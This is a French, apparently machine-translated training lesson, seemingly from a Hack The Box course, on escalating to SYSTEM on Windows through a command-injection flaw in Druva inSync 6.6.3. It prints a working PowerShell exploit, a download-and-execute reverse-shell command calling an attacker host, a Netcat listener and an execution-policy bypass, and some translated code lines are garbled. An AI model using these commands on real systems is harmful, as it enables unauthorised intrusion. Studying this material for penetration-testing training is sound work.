Services vulnérables
===================

* * * * *

Nous pouvons être en mesure d'élever les privilèges sur des systèmes bien corrigés et bien configurés si les utilisateurs sont autorisés à installer des logiciels ou si des applications/services tiers vulnérables sont utilisés dans toute l'organisation. Il est courant de rencontrer une multitude d'applications et de services différents sur les postes de travail Windows lors de nos évaluations. Examinons un exemple de service vulnérable que nous pourrions rencontrer dans un environnement réel. Certains services/applications peuvent nous permettre de passer à SYSTEM. En revanche, d'autres pourraient provoquer une condition de déni de service ou autoriser l'accès à des données sensibles telles que des fichiers de configuration contenant des mots de passe.

* * * * *

#### Énumération des programmes installés

Comme indiqué précédemment, commençons par énumérer les applications installées pour avoir un aperçu du terrain.

Énumération des programmes installés

```
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127

```

La sortie semble généralement standard pour un poste de travail Windows 10. Cependant, l'application `Druva inSync` se démarque. Une recherche rapide sur Google montre que la version `6.6.3` est vulnérable à une attaque par injection de commande via un service RPC exposé. Nous pourrons peut-être utiliser [ce](https://www.exploit-db.com/exploits/49211) exploiter la PoC pour augmenter nos privilèges. À partir de cet [article de blog](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) qui détaille la découverte initiale de la faille, nous pouvons voir que Druva inSync est une application utilisé pour la "sauvegarde intégrée, la découverte électronique et la surveillance de la conformité", et l'application cliente exécute un service dans le contexte du puissant compte `NT AUTHORITY\SYSTEM` . L'escalade est possible en interagissant avec un service exécuté localement sur le port 6064.

#### Énumération des ports locaux

Faisons une énumération supplémentaire pour confirmer que le service fonctionne comme prévu. Un coup d'œil rapide avec `netstat` montre un service s'exécutant localement sur le port `6064`.

Énumération des ports locaux

```
C:\htb> netstat -ano | findstr 6064

   TCP 127.0.0.1:6064 0.0.0.0:0 ÉCOUTE 3324
   TCP 127.0.0.1:6064 127.0.0.1:50274 ÉTABLI 3324
   TCP 127.0.0.1:6064 127.0.0.1:50510 TIME_WAIT 0
   TCP 127.0.0.1:6064 127.0.0.1:50511 TIME_WAIT 0
   TCP 127.0.0.1:50274 127.0.0.1:6064 ÉTABLI 3860

```

#### ID de processus d'énumération

Ensuite, mappons l'ID de processus (PID) `3324` au processus en cours d'exécution.

ID de processus d'énumération

```
PS C:\htb> get-process -Id 3324

Gère NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
------- ------ ----- ----- ------ -- -- -----------
     149 10 1512 6748 3324 0 inSyncCPHwnet64

```

#### Énumération du service en cours d'exécution

À ce stade, nous disposons de suffisamment d'informations pour déterminer que l'application Druva inSync est effectivement installée et en cours d'exécution, mais nous pouvons effectuer une dernière vérification à l'aide de la cmdlet `Get-Service` .

Énumération du service en cours d'exécution

```
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service

```

* * * * *

Exemple d'escalade de privilèges locaux du client Windows Druva inSync
-------------------------------------------------- ------------

#### PoC Druva inSync PowerShell

Avec ces informations en main, essayons l'exploit PoC, qui est ce court extrait de PowerShell.

Code : PowerShell

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

```

#### Modification de PowerShell PoC

Pour nos besoins, nous voulons modifier la variable `$cmd` à la commande souhaitée. Nous pouvons faire beaucoup de choses ici, comme ajouter un utilisateur administrateur local (ce qui est un peu bruyant, et nous voulons éviter de modifier les choses sur les systèmes clients dans la mesure du possible) ou nous envoyer un reverse shell. Essayons ceci avec [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Téléchargez le script dans notre boîte d'attaque et renommez-le simplement `shell.ps1`. Ouvrez le fichier et ajoutez ce qui suit au bas du fichier de script (en modifiant également l'adresse IP pour qu'elle corresponde à notre adresse et à notre port d'écoute) :

Modification de PowerShell PoC

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

```

Modifiez la variable `$cmd` dans le script PoC de l'exploit Druva inSync pour télécharger notre reverse shell PowerShell en mémoire.

Code : PowerShell

```
$cmd = "powershell IEX(Nouvel objet Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')"

```

#### Démarrage d'un serveur Web Python

Ensuite, démarrez un serveur Web Python dans le même répertoire où réside notre script `script.ps1`.

Démarrage d'un serveur Web Python

```
dsgsec@htb[/htb]$ python3 -m http.serveur 8080

```

#### Attraper un shell SYSTEM

Enfin, démarrez un écouteur `Netcat` sur la boîte d'attaque et exécutez le script PoC PowerShell sur l'hôte cible (après [modification de la politique d'exécution PowerShell](https://www.netspi.com/blog/technical/network-penetration- testing/15-ways-to-bypass-the-powershell-execution-policy) avec une commande telle que `Set-ExecutionPolicy Bypass -Scope Process`). Nous retrouverons une connexion shell inversée avec les privilèges `SYSTEM` si tout se passe comme prévu.

Attraper un shell SYSTEM

```
dsgsec@htb[/htb]$ nc -lvnp 9443

écoute sur [tout] 9443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.7] 58611
Windows PowerShell exécuté en tant qu'utilisateur WINLPE-WS01$ sur WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. Tous les droits sont réservés.

PS C:\WINDOWS\system32>whoami

autorité nt\système

PS C:\WINDOWS\system32> hostname

WINLPE-WS01

```

* * * * *

Passer à autre chose
---------

Cet exemple montre à quel point il peut être risqué d'autoriser les utilisateurs à installer des logiciels sur leurs machines et comment nous devons toujours énumérer les logiciels installés si nous atterrissons sur un serveur Windows ou un hôte de bureau. Les organisations doivent restreindre les droits d'administrateur local sur les ordinateurs des utilisateurs finaux en suivant le principe du moindre privilège. De plus, un outil de liste blanche d'applications peut aider à garantir que seuls les logiciels correctement vérifiés sont installés sur les postes de travail des utilisateurs.